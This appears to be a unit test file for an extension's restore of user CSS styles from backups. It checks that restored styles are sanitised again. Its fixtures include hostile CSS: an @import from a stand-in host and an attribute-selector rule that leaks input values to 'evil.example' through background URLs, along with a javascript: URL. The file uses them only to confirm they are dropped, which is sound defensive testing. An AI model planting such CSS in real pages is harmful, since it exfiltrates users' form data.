// User styles in the encrypted backup and the server backup (one payload, src/backup/payload.ts › sites.styles, read
// by readBackupStyles): read back, sanitised again on restore, junk dropped.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { readBackupStyles } from '../../src/content/userStyles.ts';

const style = {
  name: 'Red links',
  scope: '*.example.com',
  css: 'a {\n  color: red !important;\n}\n',
  enabled: true,
  source: 'assistant' as const,
  site: 'example.com',
  url: 'https://example.com/a',
  createdAt: 5,
};

test('styles read back from a backup as they were written', () => {
  const all = { ...style, scope: '*', site: '*', name: 'All', enabled: false };
  assert.deepEqual(readBackupStyles(JSON.parse(JSON.stringify([style, all])), 10), [style, all]);
});

test('styles from a backup are sanitised again: refused CSS and bad scopes are dropped, raw CSS is rewritten', () => {
  const styles = readBackupStyles(
    [
      { name: 'Evil', scope: '*', css: '@import "https://evil.example/x.css";', site: '*', createdAt: 1 },
      { name: 'Leak', scope: '*', css: 'input[value^="a"]{background:url(https://evil.example/a)}', site: '*' },
      { name: 'Bad scope', scope: 'not a scope', css: 'a{color:red}', site: 'x.com' },
      { name: 'Raw', scope: 'example.com', css: 'a{color:red}/* hi */', site: 'example.com', source: 'other', url: 'javascript:x' },
      'junk',
      null,
      { name: 'Raw again', scope: 'example.com', css: 'a { color: red }' },
    ],
    10,
  );
  assert.deepEqual(styles, [
    { name: 'Raw again', scope: 'example.com', css: 'a {\n  color: red !important;\n}\n', enabled: true, source: 'manual', site: 'example.com', createdAt: 10 },
  ]);
});

test('a backup made before styles has none', () => {
  assert.deepEqual(readBackupStyles(undefined), []);
});
